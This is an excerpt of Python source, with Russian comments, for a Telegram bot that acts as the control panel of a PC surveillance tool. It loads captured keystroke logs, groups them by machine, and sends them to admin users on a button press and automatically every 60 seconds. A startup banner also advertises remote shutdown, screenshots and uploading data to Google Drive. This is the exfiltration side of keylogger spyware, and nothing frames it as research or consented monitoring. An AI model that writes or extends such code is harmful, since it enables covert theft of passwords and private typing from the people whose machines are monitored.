...
def get_recent_keylogs():
    """Получает нажатые клавиши за последний час"""
    try:
        keylogs_data = load_json_file(KEYLOGS_FILE, {"keylogs": []})
        hour_ago = datetime.now() - timedelta(hours=1)
        
        recent_keylogs = []
        for log in keylogs_data.get("keylogs", []):
            log_time = datetime.fromisoformat(log.get("timestamp", "2000-01-01"))
            if log_time > hour_ago:
                recent_keylogs.append(log)
        
        return recent_keylogs
    except:
        return []

def check_keylogs(user_id):
    """Проверяет новые записи нажатий клавиш"""
    recent_keylogs = get_recent_keylogs()
    
    if not recent_keylogs:
        return []
    
    # Группируем по ПК
    pcs_keylogs = {}
    for log in recent_keylogs:
        pc_id = log.get("pc_id", "Unknown")
        if pc_id not in pcs_keylogs:
            pcs_keylogs[pc_id] = []
        pcs_keylogs[pc_id].append(log)
    
    # Отправляем сообщение
    for pc_id, logs in pcs_keylogs.items():
        message = f"🔑 Нажатые клавиши за последний час (ПК: {pc_id}):\n\n"
        
        for i, log in enumerate(logs[:50], 1):  # Максимум 50 записей
            key = log.get("key", "Unknown")
            time_str = datetime.fromisoformat(log.get("timestamp")).strftime("%H:%M:%S")
            message += f"{i}. {time_str}: {key}\n"
        
        if len(logs) > 50:
            message += f"\n... и еще {len(logs) - 50} нажатий"
        
        bot.send_message(user_id, message)
    
    return list(pcs_keylogs.keys())
...
def setup_bot_handlers():
    ...
    def pc_control_handler(message):
        ...
        buttons = [
            ...
            types.InlineKeyboardButton("🔑 Проверить нажатые клавиши", callback_data="pc_check_keylogs"),
...
"""
        ...
        # Обработка команд ПК
            ...
            elif call.data == "pc_check_keylogs":
                pcs_with_keylogs = check_keylogs(user_id)
                
                if pcs_with_keylogs:
                    bot.answer_callback_query(call.id, f"✅ Отправлены нажатые клавиши с {len(pcs_with_keylogs)} ПК")
                else:
                    bot.answer_callback_query(call.id, "❌ Нет нажатий клавиш за последний час")
...
if __name__ == "__main__":
    ...
    # Запускаем проверку нажатых клавиш в отдельном потоке
    def keylog_checker():
        """Проверяет новые нажатия клавиш каждые 60 секунд"""
        while True:
            try:
                auth_data = load_json_file(AUTH_USERS_FILE, {"users": []})
                admins = [user["user_id"] for user in auth_data.get("users", []) 
                ...
                for admin_id in admins:
                    check_keylogs(admin_id)
                
                time.sleep(60)
            except Exception as e:
                print(f"Ошибка в проверке нажатых клавиш: {e}")
                time.sleep(60)
    
    threading.Thread(target=screenshot_checker, daemon=True).start()
    threading.Thread(target=keylog_checker, daemon=True).start()
    ...
    print("   10. 🖥️ Управление ПК (админ) - выключение, скриншоты, логи клавиш")
    print("   11. 💾 Все данные в Google Drive")
    print(f"{'=' * 60}")
